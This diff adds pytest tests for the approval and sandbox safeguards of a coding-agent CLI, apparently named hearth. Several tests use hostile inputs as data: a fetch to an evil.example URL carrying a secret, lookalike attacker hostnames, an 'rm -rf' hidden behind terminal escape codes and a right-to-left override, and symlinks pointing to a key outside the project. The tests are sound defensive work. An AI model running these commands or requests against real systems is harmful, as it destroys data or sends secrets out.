@@ -135,3 +135,253 @@ def test_search_turned_off_means_no_web_tools(monkeypatch, tmp_path):
         names = {t["function"]["name"] for t in a.tools}
         assert ({"web_search", "web_fetch"} <= names) is enabled
         assert ("web_search" in a.messages[0]["content"]) is enabled
+
+
+# ── as the mode plain `hearth` opens ──────────────────────────────────────────
+
+import json  # noqa: E402
+import sys  # noqa: E402
+from pathlib import Path  # noqa: E402
+
+import pytest  # noqa: E402
+
+from hearth import cli, code_agent  # noqa: E402
+
+
+def _asking(root, monkeypatch, *answers):
+    """An agent whose questions are answered in turn; what it asked."""
+    asked, left = [], list(answers)
+
+    def answer(prompt=""):
+        asked.append(prompt)
+        a = left.pop(0)
+        if isinstance(a, type):
+            raise a
+        return a
+
+    monkeypatch.setattr("builtins.input", answer)
+    return CodeAgent(str(root), "http://127.0.0.1:1", "coding"), asked
+
+
+def test_a_change_is_shown_before_it_is_asked_about(tmp_path, monkeypatch, capsys):
+    (tmp_path / "a.py").write_text("one\ntwo\nthree\n")
+    a, asked = _asking(tmp_path, monkeypatch, "n", "y")
+    edit = {"path": "a.py", "old_string": "two", "new_string": "2"}
+    assert a._exec_tool("edit_file", edit) == "DENIED by user"
+    shown = capsys.readouterr().out
+    assert "-two" in shown and "+2" in shown and (tmp_path / "a.py").read_text() == "one\ntwo\nthree\n"
+    assert a._exec_tool("edit_file", edit).startswith("edited") and (tmp_path / "a.py").read_text() == "one\n2\nthree\n"
+
+
+def test_always_is_for_that_and_for_this_session(tmp_path, monkeypatch):
+    (tmp_path / "a").write_text("x")
+    a, asked = _asking(tmp_path, monkeypatch, "a", "a", "n", "n")
+    for name in ("b", "c"):
+        assert "created" in a._exec_tool("write_file", {"path": name, "content": "y"})
+    assert len(asked) == 1  # edits
+    for _ in range(2):
+        assert "[exit 0]" in a._exec_tool("run_shell", {"command": "echo hi"})
+    assert len(asked) == 2  # that command…
+    assert a._exec_tool("run_shell", {"command": "echo hi; echo more"}) == "DENIED by user"  # …and no other
+    b, asked2 = _asking(tmp_path, monkeypatch, "n")
+    assert b._exec_tool("write_file", {"path": "d", "content": "y"}) == "DENIED by user"
+
+
+def test_the_web_is_asked_about(tmp_path, monkeypatch):
+    """An address is a way out for what was read."""
+    went = []
+
+    async def dispatch(name, args, cfg):
+        went.append((name, args.get("url")))
+        return "page"
+
+    monkeypatch.setattr(code_agent.webtools, "dispatch", dispatch)
+    a, asked = _asking(tmp_path, monkeypatch, "n", "a", "n", "n")
+    assert a._exec_tool("web_fetch", {"url": "https://evil.example/?k=secret"}) == "DENIED by user" and went == []
+    assert a._exec_tool("web_fetch", {"url": "https://docs.example/a"}) == "page"
+    assert a._exec_tool("web_fetch", {"url": "https://docs.example/b"}) == "page" and len(asked) == 2
+    for other in ("https://docs.example.evil.example/", "https://docs.example@evil.example/"):
+        assert a._exec_tool("web_fetch", {"url": other}) == "DENIED by user"
+    assert len(went) == 2
+
+
+def test_what_is_shown_cannot_hide_anything(tmp_path, monkeypatch):
+    a, asked = _asking(tmp_path, monkeypatch, "n")
+    a._exec_tool("run_shell", {"command": "rm -rf x\r\x1b[2Kecho harmless \u202e"})
+    assert "\x1b[2K" not in asked[0] and "\r" not in asked[0] and "\u202e" not in asked[0] and "rm -rf x" in asked[0]
+
+
+@pytest.mark.parametrize("raw", [b"caf\xe9 = 1\n", b"a\x00b two"])
+def test_what_cannot_be_read_faithfully_is_not_written_back(tmp_path, monkeypatch, raw):
+    (tmp_path / "f").write_bytes(raw)
+    a = _agent(str(tmp_path))
+    out = a._exec_tool("edit_file", {"path": "f", "old_string": "1" if b"1" in raw else "two", "new_string": "2"})
+    assert out.startswith("ERROR") and (tmp_path / "f").read_bytes() == raw
+
+
+def test_line_endings_stay(tmp_path):
+    (tmp_path / "f").write_bytes(b"a\r\nb\r\nc\r\n")
+    a = _agent(str(tmp_path))
+    assert "edited" in a._exec_tool("edit_file", {"path": "f", "old_string": "a\nb", "new_string": "A\nB"})
+    assert (tmp_path / "f").read_bytes() == b"A\r\nB\r\nc\r\n"
+    a._exec_tool("write_file", {"path": "g", "content": "x\ny\n"})
+    assert (tmp_path / "g").read_bytes() == b"x\ny\n"
+
+
+def test_a_file_that_changed_while_it_was_asked_about(tmp_path, monkeypatch):
+    f = tmp_path / "f"
+    f.write_text("one")
+    a, _ = _asking(tmp_path, monkeypatch, "y")
+    monkeypatch.setattr("builtins.input", lambda *_: f.write_text("one, by somebody") and "y")
+    assert "changed meanwhile" in a._exec_tool("edit_file", {"path": "f", "old_string": "one", "new_string": "two"})
+    assert f.read_text() == "one, by somebody"
+
+
+@pytest.mark.skipif(sys.platform == "win32", reason="links")
+def test_links_do_not_lead_out(tmp_path):
+    (tmp_path / "out").mkdir()
+    (tmp_path / "out" / "key").write_text("SECRET")
+    root = tmp_path / "root"
+    root.mkdir()
+    (root / "in").write_text("SECRET of the project")
+    (root / "key").symlink_to(tmp_path / "out" / "key")
+    (root / "dir").symlink_to(tmp_path / "out")
+    (root / "alias").symlink_to(root / "in")
+    a = _agent(str(root))
+    hits = a._exec_tool("grep", {"pattern": "SECRET"})
+    assert sorted(h.split(":")[0] for h in hits.splitlines()) == ["alias", "in"]
+    for path in ("key", "dir/key"):
+        assert "escapes" in a._exec_tool("read_file", {"path": path})
+        assert "escapes" in a._exec_tool("write_file", {"path": path, "content": "x"})
+
+
+@pytest.mark.skipif(sys.platform == "win32", reason="sleep")
+def test_a_command_that_is_too_slow_ends_with_all_it_started(tmp_path):
+    import time
+
+    a = _agent(str(tmp_path))
+    t0 = time.monotonic()
+    out = a._exec_tool("run_shell", {"command": "(sleep 60; touch late) & sleep 60", "timeout": 1})
+    assert "timed out" in out and time.monotonic() - t0 < 20
+
+
+def test_ctrl_c_ends_the_task_and_not_the_session(tmp_path, monkeypatch):
+    calls = [{"id": "1", "function": {"name": "run_shell", "arguments": json.dumps({"command": "x"})}},
+             {"id": "2", "function": {"name": "grep", "arguments": json.dumps({"pattern": "x"})}}]
+    a, _ = _asking(tmp_path, monkeypatch, KeyboardInterrupt)
+    monkeypatch.setattr(a, "_stream_turn", lambda: ("", calls))
+    assert a.ask("do it") == ""
+    # every call has its result, and the conversation can go on
+    assert [m.get("tool_call_id") for m in a.messages if m["role"] == "tool"] == ["1", "2"]
+    assert a.messages[-1]["role"] == "assistant"
+    monkeypatch.setattr(a, "_stream_turn", lambda: (_ for _ in ()).throw(KeyboardInterrupt))
+    assert a.ask("again") == "" and a.messages[-1]["role"] == "assistant"
+
+
+def test_a_request_that_failed_is_not_asked_twice(tmp_path, monkeypatch):
+    a = _agent(str(tmp_path))
+    monkeypatch.setattr(a, "_stream_turn", lambda: (None, []))
+    n = len(a.messages)
+    a.ask("x")
+    assert len(a.messages) == n
+
+
+# ── getting there ─────────────────────────────────────────────────────────────
+
+@pytest.fixture
+def terminal(tmp_path, monkeypatch):
+    """At a terminal, in a folder, with an engine that has a model."""
+    monkeypatch.setenv("HEARTH_CONFIG", str(tmp_path / "conf" / "config.yaml"))
+    project = tmp_path / "project"
+    (project / "sub").mkdir(parents=True)
+    monkeypatch.chdir(project)
+    monkeypatch.setattr(sys.stdin, "isatty", lambda: True, raising=False)
+    monkeypatch.setattr(cli, "_engine_ready", lambda cfg, role, model: "http://127.0.0.1:1")
+    said = []
+
+    def answers(*lines):
+        left = list(lines)
+
+        def answer(prompt=""):
+            said.append(prompt)
+            if not left:
+                raise EOFError
+            return left.pop(0)
+
+        monkeypatch.setattr("builtins.input", answer)
+        return said
+
+    answers.project = project
+    return answers
+
+
+def test_a_folder_is_trusted_once(terminal, monkeypatch):
+    said = terminal("n")
+    assert cli.main([]) == 1 and len(said) == 1  # no: nothing is read
+    said = terminal("y", "/exit")
+    said.clear()
+    assert cli.main([]) == 0 and "trust" in said[0]
+    for folder in (terminal.project, terminal.project / "sub"):
+        monkeypatch.chdir(folder)
+        said.clear()
+        terminal("/exit")
+        assert cli.main([]) == 0 and len(said) == 1, folder
+    said.clear()
+    terminal("n")
+    monkeypatch.chdir(terminal.project.parent)
+    assert cli.main([]) == 1 and "trust" in said[0]  # what it is in, is another question
+
+
+def test_home_is_asked_about_each_time_and_trusts_nothing_in_it(terminal, monkeypatch):
+    home = terminal.project.parent
+    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
+    monkeypatch.chdir(home)
+    for _ in range(2):
+        said = terminal("y", "/exit")
+        said.clear()
+        assert cli.main([]) == 0 and "trust" in said[0]
+    monkeypatch.chdir(terminal.project)
+    said = terminal("n")
+    said.clear()
+    assert cli.main([]) == 1 and "trust" in said[0]
+
+
+def test_nobody_to_ask_is_refused(terminal, monkeypatch, capsys):
+    monkeypatch.setattr(sys.stdin, "isatty", lambda: False, raising=False)
+    said = terminal("y", "y")
+    assert cli.main([]) == 2 and said == [] and "hearth -p" in capsys.readouterr().err
+
+
+def test_one_task_and_its_answer(terminal, monkeypatch, capsys):
+    said = terminal()
+    monkeypatch.setattr(CodeAgent, "ask", lambda self, t: f"did {t}" if self.auto else "")
+    assert cli.main(["-p", "it", "-q"]) == 0 and capsys.readouterr().out.strip() == "did it" and said == []
+    monkeypatch.setattr(CodeAgent, "ask", lambda self, t: "")
+    assert cli.main(["-p", "it"]) == 1  # a script can tell
+
+
+def test_from_one_mode_to_the_other_and_back(terminal, monkeypatch, capsys):
+    agents = []
+    made = CodeAgent.__init__
+    monkeypatch.setattr(CodeAgent, "__init__", lambda self, *a, **k: agents.append(1) or made(self, *a, **k))
+    terminal("y", "/chat", "/system be brief", "/code", "/chat", "/system", "/exit")
+    assert cli.main([]) == 0
+    out = capsys.readouterr().out
+    assert agents == [1] and "system: be brief" in out  # each kept what it had
+
+
+def test_without_a_model_it_says_where_to_choose_one(monkeypatch, capsys, tmp_path):
+    import httpx
+
+    from hearth import background, config
+
+    monkeypatch.setenv("HEARTH_CONFIG", str(tmp_path / "config.yaml"))
+    cfg = config.load()
+    up = []
+    monkeypatch.setattr(background, "gateway_identity", lambda c: "hearth/9" if up else None)
+    monkeypatch.setattr(cli, "cmd_start", lambda a: up.append(a.background) or 0)
+    monkeypatch.setattr(cli.httpx, "get", lambda *a, **k: httpx.Response(200, json={"roles": {"embedding": {}}}))
+    assert cli._engine_ready(cfg, "coding", None) is None
+    assert up == [True] and "hearth setup" in capsys.readouterr().err
+    assert cli._engine_ready(cfg, "coding", "some-model") == cli._admin_base(cfg)  # one was named
+    assert cli._engine_ready(cfg, "embedding", None) and up == [True]  # started once
